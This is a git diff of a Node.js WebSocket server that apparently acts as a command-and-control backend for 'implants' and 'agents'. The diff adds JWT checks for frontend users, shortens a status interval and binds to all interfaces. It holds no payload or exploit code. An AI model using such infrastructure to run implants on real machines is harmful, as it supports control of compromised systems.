@@ -9,7 +9,8 @@ import http from 'http'
 import cmd_router from './routes/cmd_routes.mjs';
 import implant_router from './routes/implant_routes.mjs';
 import Implant from './models/Implant_model.mjs';
-import cors from 'cors'
+import cors from 'cors';
+import jwt from 'jsonwebtoken';
 
 
 
@@ -23,16 +24,24 @@ const webSocketsServer = async (httpServer) => {
       const url = new URL(request.url, `http://${request.headers.host}`);
       const clientId = url.searchParams.get('id');
       const rol = url.searchParams.get('rol');
+      const token = url.searchParams.get('token');
 
-      // Si es usuario (frontend)
-      if (rol === 'usuario') {      //cvalidacion de token
-        console.log('Usuario conectado (frontend)');
-        users.add(socket);
+      if (rol === 'usuario') {
+        try {
+          const decoded = jwt.verify(token, process.env.SEED); // valida y decodifica el JWT
 
-        socket.on('close', () => {
-          console.log('Usuario desconectado');
-          users.delete(socket);
-        });
+          users.add(socket);
+
+          socket.on('close', () => {
+            console.log('Usuario desconectado');
+            users.delete(socket);
+          });
+
+        } catch (err) {
+          console.log('Token inválido:', err.message);
+          socket.send('invalid')
+          socket.close(); // cerrar conexión si el token es inválido
+        }
 
         return;
       }
@@ -55,15 +64,6 @@ const webSocketsServer = async (httpServer) => {
 
       socket.on('pong', () => socket.isAlive = true);
 
-/*       socket.on('message', (data) => {  //validar token de usuario
-        try {
-          const msg = JSON.parse(data);
-
-
-        } catch (e) {
-          console.error('Error procesando mensaje:', e);
-        }
-      }); */
 
       socket.on('close', () => {
         console.log(`Agente ${clientId} desconectado`);
@@ -104,7 +104,7 @@ const webSocketsServer = async (httpServer) => {
         userSocket.send(JSON.stringify(status_connections));
       }
     });
-    }, 5000);
+    }, 2000);
 
     server.on("close", () => clearInterval(interval));
 
@@ -139,7 +139,7 @@ const main = async () =>{
     app.use(type_errors);
     app.use(syntax_errors);
     
-    server.listen(process.env.PORT,  ()=> console.log(`Esuchando en el puerto ${process.env.PORT}`))
+    server.listen(process.env.PORT, '0.0.0.0', ()=> console.log(`Esuchando en el puerto ${process.env.PORT}`))
 
 }
 main()
